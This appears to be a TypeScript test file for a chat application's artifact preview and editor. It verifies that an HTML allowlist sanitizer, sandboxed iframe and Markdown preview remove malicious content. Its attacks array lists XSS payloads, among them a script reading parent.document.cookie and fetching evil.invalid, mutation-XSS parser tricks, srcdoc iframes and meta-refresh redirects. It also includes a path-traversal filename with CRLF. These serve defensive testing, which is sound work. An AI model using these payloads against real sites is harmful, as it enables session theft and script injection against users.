import { expect, test } from "bun:test";
import { fromHtml } from "hast-util-from-html";
import { renderToStaticMarkup } from "react-dom/server";
import {
  ArtifactEditor,
  ArtifactPreview,
} from "../components/artifacts/artifact-workbench";
import { ChatMessages } from "../components/chat/chat-messages";
import {
  artifactContent,
  artifactFilename,
  artifactSource,
} from "../lib/artifacts/contract";
import {
  artifactPreviewDocument,
  markdownPreviewDocument,
} from "../lib/artifacts/preview";
import { uiHarnessEnabled } from "../lib/ui/availability";

const attacks = [
  `<script>parent.document.cookie;fetch('https://evil.invalid')</script>`,
  `<img src='https://evil.invalid' srcset='https://evil.invalid/x 1x' onerror='alert(1)'><video poster='https://evil.invalid'><source src='https://evil.invalid'></video>`,
  `<a href='https://evil.invalid' target='_top' ping='https://evil.invalid' download>click</a><a href='javascript:alert(1)'>JS</a>`,
  `<base href='https://evil.invalid'><meta http-equiv='refresh' content='0;url=https://evil.invalid'><link rel='stylesheet' href='https://evil.invalid'>`,
  `<form action='https://evil.invalid'><button formaction='https://evil.invalid'>Submit</button><input autofocus onfocus='alert(1)'></form>`,
  `<svg><a xlink:href='javascript:alert(1)'>x</a><foreignObject><iframe src='https://evil.invalid'></iframe></foreignObject></svg>`,
  `<math><mtext><table><mglyph><style><!--</style><img title='--><img src=https://evil.invalid onerror=alert(1)>'>`,
  `<iframe srcdoc='<script>parent.alert(1)</script>'></iframe><object data='https://evil.invalid'></object><embed src='https://evil.invalid'>`,
  `<div style='background:url(https://evil.invalid)' onclick='alert(1)' id='parent' name='location'>Text</div><style>@import 'https://evil.invalid';</style>`,
  `<noscript><p title='</noscript><img src=https://evil.invalid onerror=alert(1)>'>x</p>`,
];
test("F11 parser-based HTML allowlist removes malicious nodes, navigation, resources and parent-access hooks", () => {
  for (const attack of attacks) {
    const document = artifactPreviewDocument(
      `<h1>Kept</h1>${attack}<p>Readable</p>`,
    );
    const body = document.split("<body>")[1];
    expect(body).toContain("<h1>Kept</h1>");

    expect(body).not.toMatch(
      /<(script|img|iframe|object|embed|svg|math|form|input|button|base|link|meta|style)\b/i,
    );
    const nodes = [...fromHtml(body, { fragment: true }).children];
    while (nodes.length) {
      const node = nodes.pop();
      if (node?.type !== "element") continue;
      expect(
        Object.keys(node.properties).every((name) =>
          [
            "title",
            "lang",
            "dir",
            "colSpan",
            "rowSpan",
            "scope",
            "start",
          ].includes(name),
        ),
      ).toBe(true);
      nodes.push(...node.children);
    }
    expect(document).toContain("default-src 'none'");
    expect(document).toContain("base-uri 'none'");
  }
  const frame = renderToStaticMarkup(
    <ArtifactPreview source={attacks.join("")} kind="html" />,
  );
  expect(frame).toContain('sandbox=""');
  expect(frame).toContain('referrerPolicy="no-referrer"');
  expect(frame).not.toContain("allow-scripts");
  expect(frame).not.toContain("allow-same-origin");
});
test("F11 Markdown preview never imports MDX, follows links or loads images; large/deep documents remain bounded", () => {
  const document = markdownPreviewDocument(
    `# Title\n\nimport Attack from 'https://evil.invalid/module'\n\n[link](javascript:alert)\n\n![remote](https://evil.invalid/pixel)\n\n<script>parent.fetch('https://evil.invalid')</script>\n\n<Component run={evil()} />`,
  );
  const body = document.split("<body>")[1];
  expect(body).toContain("<h1>Title</h1>");
  expect(body).not.toContain("<img");
  expect(body).not.toContain("<script");
  expect(body).not.toContain("href=");
  expect(artifactPreviewDocument("x".repeat(131073))).toContain(
    "Preview unavailable",
  );
  expect(
    artifactPreviewDocument(
      `${"<div>".repeat(10000)}deep${"</div>".repeat(10000)}`,
    ).length,
  ).toBeLessThan(5000);
  expect(
    markdownPreviewDocument(`# Long\n\n${"word ".repeat(20000)}`),
  ).toContain("<h1>Long</h1>");
});
test("F11 editor exposes labels and history, UTF-8 bounds and safe downloads; only opted-in saved chat messages show create", () => {
  const document = {
    id: "id",
    chatId: "chat",
    messageId: "message",
    kind: "html" as const,
    version: 1,
    title: "Title",
    content: attacks.join(""),
    updatedAt: "2026-10-17",
    revisions: [
      {
        version: 1,
        title: "Title",
        restoredFrom: null,
        createdAt: "2026-10-17",
      },
    ],
  };
  const html = renderToStaticMarkup(
    <ArtifactEditor
      document={document}
      onChange={() => {}}
      onDeleted={() => {}}
    />,
  );
  expect(html).toContain("HTML source");
  expect(html).toContain("Save revision");
  expect(html).toContain("History");
  expect(html).toContain('role="tablist"');
  expect(html).toContain('role="tab"');
  expect(html).not.toContain("Saving…");
  expect(html).toContain("Download saved HTML source (.txt)");
  expect(html).not.toContain("<script>");
  expect(artifactFilename('../../unsafe"\r\n<script>', "html")).toBe(
    "unsafe-script.html.txt",
  );
  expect(artifactContent.safeParse("😀".repeat(32769)).success).toBe(false);
  expect(
    artifactSource(
      [{ type: "text", text: "```html\n<h1>Exact source</h1>\n```" }],
      "html",
    ),
  ).toBe("<h1>Exact source</h1>");
  const props = {
    messages: [
      {
        id: "assistant",
        role: "assistant" as const,
        parts: [{ type: "text" as const, text: "Saved answer" }],
      },
    ],
    status: "ready" as const,
    regenerate: () => {},
    setMessages: () => {},
  };
  expect(
    renderToStaticMarkup(
      <ChatMessages {...props} artifactChatId="saved-chat" />,
    ),
  ).toContain("Create artifact");
  expect(renderToStaticMarkup(<ChatMessages {...props} />)).not.toContain(
    "Create artifact",
  );
  expect(
    renderToStaticMarkup(
      <ChatMessages
        {...props}
        artifactChatId="saved-chat"
        status="streaming"
      />,
    ),
  ).not.toContain("Create artifact");
  expect(
    uiHarnessEnabled({ NODE_ENV: "production", F04_UI_HARNESS: "1" }),
  ).toBe(false);
});
